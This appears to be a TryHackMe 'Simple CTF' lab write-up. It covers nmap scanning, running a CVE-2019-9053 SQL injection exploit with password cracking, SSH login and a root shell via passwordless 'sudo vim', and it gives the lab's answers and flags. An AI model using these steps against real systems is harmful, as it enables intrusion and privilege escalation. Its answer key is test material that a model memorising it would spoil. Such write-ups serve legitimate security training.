# Simple CTF

```
export ip=10.10.208.204
```

# 1. How many services are running under port 1000?


```
run nmap scan on machine using -sC -sV 
```
```json
nmap -sC -sV -oN nmap/initial 10.10.208.204
```


```
answer: 2
```

# 2. What is running on the higher port?

```
we will use -p 0-9999 to specify scan ports from 0 to 9999 in nmap
```

```json
nmap -p 0-9999 -oN nmap/all_ports 10.10.208.204
```
```
I ftp into 10.10.208.204 and found ForMitch.txt and grabbed it to my host using get
```

```
answer: ssh
```

# 3. What's the CVE you're using against the application? 

```
searched for exploits against the web servers host template version (2.2.8) which is usually found at the bootom of websites and found CVE-2019-9053
```

```
answer: CVE-2019-9053
```

# 4. To what kind of vulnerability is the application vulnerable?

```
the exploit was a SQL Injection and since tryhackme states the answer is 4 letters it should be SQLi
```

```
answer: SQLi
```

# 5. What's the password?

```
we run the python exploit and specify the rhosts and using --crack we will attempt to crack the password using a wordlist in this case best110.txt
```

```json
python3 exploit.py -u http://10.10.208.204/simple --crack -w /thm/best110.txt 
```
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

```
answer: secret
```

# 6. Where can you login with the details obtained?

```
answer: ssh
```

# 7. What's the user flag?

```
we can run find / -name user* 2>/dev/null to search the computer for the flag if its not located in the home directory otherwise we can cat the file when found. cat /home/mitch/user.txt
```

```
Answer:"G00d j0b, keep up!"
```

# 8. Is there any other user in the home directory? What's its name?

```
if we cd ../ to go back to the parent directory we can see a user folder of someone named "sunbath"
```

```
Answer: sunbath
```

# 9. What can you leverage to spawn a privileged shell?

```
the first thing i do when im attempting to privesc is running sudo -l to see what im able to run as root. in this case we can run /usr/bin/vim as sudo without needing a password. using gtfobins we can see that using vim we can spawn a shell however because this box doesnt need a password for sudo vim we can spawn and leverage this vulnerability.
```

```
Answer: vim
```

# 10. What's the root flag?

```json
running sudo vim -c ':!/bin/sh' will now give us root privilidges on the system 
```
```
due to the user "mitch" being able to run vim as sudo without a password. root flags are usually stored in /root however if not we can always use find to search for the file. In this cate the flag is stored in /root/root.txt so lets cat the file and finish the box!
```

```
Answer: W3ll d0n3. You made it!
```

```json
Congrats u have completed Simple CTF!
```

